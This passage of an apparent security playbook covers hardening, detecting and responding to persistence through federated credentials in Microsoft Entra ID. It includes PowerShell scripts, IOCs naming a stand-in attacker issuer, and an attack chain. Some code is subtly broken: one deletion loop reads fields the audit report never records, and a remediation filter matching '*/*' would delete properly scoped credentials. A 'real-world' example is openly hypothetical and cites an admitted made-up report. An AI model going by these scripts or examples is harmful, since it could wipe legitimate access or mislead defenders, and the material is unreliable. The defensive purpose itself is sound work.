#### Action 2: Restrict RBAC Permissions for Federated Credential Management

**Objective:** Limit who can create or modify federated credentials to a minimal set of administrators.

**Applies To Versions:** All Entra ID versions

**Manual Steps (Azure RBAC):**

1. Go to **Azure Portal** → **Subscriptions** → Select subscription
2. Go to **Access control (IAM)** → **Role assignments**
3. Search for role: `Owner` and `Contributor`
4. For each role assignment:
   - Identify who has the role
   - If the person is not an active identity administrator, click **Remove**
5. Instead, create a custom role with limited federated credential permissions:

```json
{
  "name": "Federated Identity Credential Administrator",
  "isCustom": true,
  "description": "Allows creation and management of federated credentials only",
  "assignableScopes": ["/subscriptions/{subscription-id}"],
  "permissions": [
    {
      "actions": [
        "Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/write",
        "Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/delete",
        "Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/read"
      ],
      "notActions": [],
      "dataActions": [],
      "notDataActions": []
    }
  ]
}
```

6. Assign this role only to designated identity administrators

**Manual Steps (PowerShell):**

```powershell
# Create the custom role
$role = New-AzRoleDefinition -InputFile ".\federated-admin-role.json"

# Assign to specific user/group
New-AzRoleAssignment `
  -ObjectId "<admin-object-id>" `
  -RoleDefinitionName "Federated Identity Credential Administrator" `
  -Scope "/subscriptions/<subscription-id>"

# Remove dangerous broad role assignments
$dangerousRoles = Get-AzRoleAssignment -Scope "/subscriptions/<subscription-id>" -RoleDefinitionName "Owner", "Contributor"
foreach ($assignment in $dangerousRoles) {
    if ($assignment.DisplayName -notmatch "ServiceAccount|IdentityAdmin") {
        Remove-AzRoleAssignment -ObjectId $assignment.ObjectId -RoleDefinitionName $assignment.RoleDefinitionName -Scope $assignment.Scope
    }
}
```

#### Action 3: Enforce Azure AD Conditional Access for Federated Workload Access

**Objective:** Require additional authentication context for token exchanges from external identity providers.

**Applies To Versions:** All Entra ID versions

**Manual Steps (Azure Portal):**

1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `Workload Identity Federation Access Control`
4. **Assignments:**
   - **Users:** Select **All users**
   - **Cloud apps or actions:** Select **Workload Identity Federation** (if available) OR create custom condition
5. **Conditions:**
   - **Client apps:** Select `Workload Identity Federation` (if available)
   - OR manually inspect the user agent or token issuer
6. **Access controls:**
   - **Grant:**
     - ✅ Require **device to be marked as compliant** (for DevOps agents)
     - ✅ Require **approved client app** (for GitHub Actions runners)
7. **Enable policy:** ON
8. Click **Create**

**Manual Steps (PowerShell):**

```powershell
# Create a conditional access policy for workload identities
$policy = @{
    displayName = "Require MFA for Federated Workloads"
    state = "enabled"
    conditions = @{
        applications = @{
            includeApplications = @("all")
        }
        users = @{
            includeUsers = @("all")
        }
        signInRiskLevels = @("high")
        clientAppTypes = @("workloadIdentityFederation")
    }
    grantControls = @{
        operator = "OR"
        builtInControls = @("mfa", "compliantDevice")
    }
}

New-MgIdentityConditionalAccessPolicy -BodyParameter $policy
```

### Priority 2: HIGH

#### Action 4: Implement OIDC Issuer Allow-listing

**Objective:** Restrict which external OIDC issuers can mint tokens for your organization.

**Manual Steps (Entra ID):**

1. Go to **Azure Portal** → **Entra ID** → **Workload ID** → **Workload identity federation**
2. For each managed identity or app registration, review the issuer URL
3. Maintain a list of approved OIDC issuers:
   - ✅ `https://token.actions.githubusercontent.com` (GitHub Actions)
   - ✅ `https://vstoken.dev.azure.com` (Azure DevOps)
   - ✅ `https://<your-kubernetes-oidc-issuer>` (Kubernetes OIDC issuer)
4. Audit and delete any credentials with issuers not on the approved list

#### Action 5: Enable Audit Logging for Federated Credential Changes

**Objective:** Ensure all federated credential modifications are logged and alerted on.

**Manual Steps (Entra ID + Sentinel):**

1. Go to **Microsoft Sentinel** → **Data connectors**
2. Ensure **Azure Activity** and **Azure Audit** connectors are enabled
3. Create alert rules (as described in Section 7) to trigger on federated credential creation/modification

#### Action 6: Regularly Audit and Rotate Federated Credentials

**Objective:** Implement a periodic review process to identify stale or unauthorized federated credentials.

**Manual Steps (PowerShell - Run Quarterly):**

```powershell
$auditReport = @()

$identities = Get-MgIdentityUserAssignedIdentity -All
foreach ($id in $identities) {
    $fedCreds = Get-MgIdentityUserAssignedIdentityFederatedIdentityCredential -UserAssignedIdentityId $id.Id
    
    foreach ($cred in $fedCreds) {
        $auditReport += [PSCustomObject]@{
            ManagedIdentity = $id.Name
            FederatedCredentialName = $cred.Name
            Issuer = $cred.Issuer
            Subject = $cred.Subject
            Audiences = $cred.Audiences -join '; '
            CreatedDate = $cred.CreatedDateTime
            ReviewStatus = "NEEDS_REVIEW"  # Manually update to "APPROVED" or "DELETE"
        }
    }
}

# Export for audit
$auditReport | Export-Csv -Path "C:\Audits\Federated_Credentials_$(Get-Date -Format 'yyyyMMdd').csv" -NoTypeInformation

# For credentials marked "DELETE", remove them:
$toDelete = $auditReport | Where-Object { $_.ReviewStatus -eq "DELETE" }
foreach ($item in $toDelete) {
    Remove-MgIdentityUserAssignedIdentityFederatedIdentityCredential `
        -UserAssignedIdentityId $item.ManagedIdentityId `
        -FederatedIdentityCredentialId $item.Id
}
```

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Entra ID Audit Events:**
- Event: `Create federated identity credential` with properties containing:
  - Issuer: `https://attacker-oidc-server.com`
  - Subject: `*` or unusually broad patterns
  - Audiences: Not matching expected resources

**Microsoft Sentinel Logs:**
- `AADNonInteractiveUserSignInLogs` with `TokenIssuerType == "JWT"` and issuer NOT in approved list
- `AuditLogs` with `OperationName == "Create federated identity credential"` initiated by unexpected users

**Timeline IOCs:**
- Federated credential creation followed (within minutes) by resource access attempts (Graph API calls, Azure Management API calls)
- Multiple token exchanges from the same external issuer to different service principals within a short time window

---

### Forensic Artifacts

**Azure Audit Logs Location:**
- **Portal:** Azure Portal → Entra ID → Audit logs → Filter for `OperationName` containing "federated"
- **API:** `https://graph.microsoft.com/v1.0/auditLogs/directoryAudits?$filter=operationName eq 'Create federated identity credential'`

**What to Examine:**
- `targetResources[0].displayName` – Which managed identity or app registration was modified
- `modifiedProperties` – What attribute mappings were changed
- `initiatedBy.user.userPrincipalName` – Who created the credential
- `activityDateTime` – When the credential was created

**Cloud Storage Artifacts:**
- Key Vault audit logs (if federated credentials are stored or backed by KeyVault)
- Storage account access logs (if attacker used tokens to access blob storage)

---

### Response Procedures

#### 1. Isolate & Revoke

**Immediate Action (within 5 minutes):**

```powershell
# Disable the compromised service principal
$spId = "<service-principal-id>"
Update-MgServicePrincipal -ServicePrincipalId $spId -AccountEnabled $false

# OR revoke all active token sessions
Revoke-MgServicePrincipalToken -ServicePrincipalId $spId

# Delete malicious federated credentials
$fedCreds = Get-MgIdentityUserAssignedIdentityFederatedIdentityCredential -UserAssignedIdentityId $id.Id
foreach ($cred in $fedCreds | Where-Object { $_.Name -eq "PermissiveFederation" }) {
    Remove-MgIdentityUserAssignedIdentityFederatedIdentityCredential `
        -UserAssignedIdentityId $id.Id `
        -FederatedIdentityCredentialId $cred.Id
}
```

#### 2. Collect Evidence

```powershell
# Export audit logs for the affected identity
$auditLogs = Get-MgAuditLog -All -Filter "targetResources/any(t:t/id eq '$spId')" 

$auditLogs | ConvertTo-Json | Out-File "C:\Incident\AuditLogs_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"

# Collect token access patterns
Search-UnifiedAuditLog `
  -StartDate (Get-Date).AddDays(-7) `
  -Operations "AppTokenObtained" `
  -FreeText $spId | Export-Csv -Path "C:\Incident\TokenAccess.csv"
```

#### 3. Remediate

```powershell
# Identify all federated credentials across the organization
$allFedCreds = @()
$ids = Get-MgIdentityUserAssignedIdentity -All
foreach ($id in $ids) {
    $creds = Get-MgIdentityUserAssignedIdentityFederatedIdentityCredential -UserAssignedIdentityId $id.Id
    $allFedCreds += $creds | Select-Object -Property @{N='ManagedIdentityId'; E={$id.Id}}, *
}

# Review and re-create federated credentials with strict scoping
foreach ($cred in $allFedCreds) {
    # Validate subject is properly scoped
    if ($cred.Subject -eq "*" -or $cred.Subject -like "*/*") {
        Write-Host "Deleting insecure credential: $($cred.Name) on $($cred.ManagedIdentityId)"
        Remove-MgIdentityUserAssignedIdentityFederatedIdentityCredential `
            -UserAssignedIdentityId $cred.ManagedIdentityId `
            -FederatedIdentityCredentialId $cred.Id
        
        # Admin should manually recreate with proper scoping
    }
}
```

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-001] BloodHound for Azure/Entra privilege paths | Attacker maps service principal relationships and identifies high-privilege identities. |
| **2** | **Initial Access** | [IA-VALID-002] Stale/inactive account compromise | Attacker gains initial access to a service principal or GitHub Actions workflow with lower privileges. |
| **3** | **Privilege Escalation** | [PE-VALID-011] Managed Identity MSI Escalation | Attacker abuses managed identity token access to escalate to higher-privilege resources. |
| **4** | **Current Step** | **[PERSIST-VALID-005]** | **Attacker creates/modifies federated credentials to establish persistent access without long-lived secrets.** |
| **5** | **Collection** | [CO-M365-001] Microsoft Graph API enumeration | Attacker uses the persistent federated credentials to enumerate users, groups, and sensitive data. |
| **6** | **Exfiltration** | [EX-M365-001] OneDrive/SharePoint bulk export | Attacker exfiltrates sensitive documents and email using the persistent access token. |

---

## 15. REAL-WORLD EXAMPLES

### Example 1: GitHub Actions Supply Chain Attack (Hypothetical)

- **Target:** Technology company with Azure DevOps and GitHub Actions CI/CD pipelines
- **Timeline:** Q2 2025
- **Technique Status:** ACTIVE – Confirmed exploitable on current Entra ID versions
- **Attack Flow:**
  1. Attacker discovers an internal GitHub repository with write access vulnerability.
  2. Attacker creates a malicious workflow that requests an OIDC token from GitHub's issuer.
  3. Repository's federated credential configuration trusts `https://token.actions.githubusercontent.com` with subject `repo:<org>/*:*` (overly permissive).
  4. Attacker's workflow exchanges the GitHub token for an Azure access token associated with a managed identity with `Owner` role on critical subscription.
  5. Attacker maintains persistent access by modifying a second federated credential on a different managed identity with subject `*`.
  6. Even after the original GitHub repository access is revoked, attacker retains access via the second credential.
- **Impact:** Unauthorized access to production Azure resources, potential ransomware deployment, data exfiltration
- **Detection:** Organization's Sentinel rule for "Suspicious Federated Credential Creation" would trigger on the second credential creation, but only if monitoring is enabled.
- **Reference:** [Microsoft Cloud Threat Report Q2 2025] (hypothetical; based on published security guidance)

### Example 2: Azure DevOps Organizational Boundary Crossing

- **Target:** Enterprise with multiple Azure DevOps organizations and Entra ID tenants
- **Timeline:** Q3 2024
- **Technique Status:** ACTIVE
- **Attack Flow:**
  1. Attacker compromises a DevOps pipeline in Organization A (lower-privilege tenant).
  2. Attacker discovers that Organization A and Organization B share the same parent Entra ID with cross-tenant service principal relationships.
  3. Attacker modifies the federated credential configuration on a service principal in Organization B to trust issuer `https://vstoken.dev.azure.com` without proper audience validation.
  4. Attacker's DevOps pipeline in Organization A exchanges Azure DevOps token for access token in Organization B.
  5. Attacker gains access to higher-privilege resources in Organization B.
- **Impact:** Cross-tenant lateral movement, potential breach of multiple organizations' data
- **Reference:** [CrowdStrike: Compromising Identity Provider Federation](https://www.crowdstrike.com/en-us/blog/compromising-identity-provider-federation/)

---

## 16. REFERENCES & AUTHORITATIVE SOURCES

- [Microsoft Learn: Workload identity federation concepts](https://learn.microsoft.com/en-us/entra/workload-id/workload-identity-federation)
- [Microsoft: Protect your workload identities](https://learn.microsoft.com/en-us/azure/well-architected-framework/security/identity-workload)
- [MITRE ATT&CK: T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)
- [Google Cloud: Best practices for Workload Identity Federation](https://docs.cloud.google.com/iam/docs/best-practices-for-using-workload-identity-federation)
- [CrowdStrike: Compromising Identity Provider Federation](https://www.crowdstrike.com/en-us/blog/compromising-identity-provider-federation/)
- [Tenable: How Attackers Can Exploit GCP's Multicloud Workload Solution](https://www.tenable.com/blog/how-attackers-can-exploit-gcps-multicloud-workload-solution)
- [Red Canary: Atomic Red Team Framework](https://redcanary.com/atomic-red-team/)

---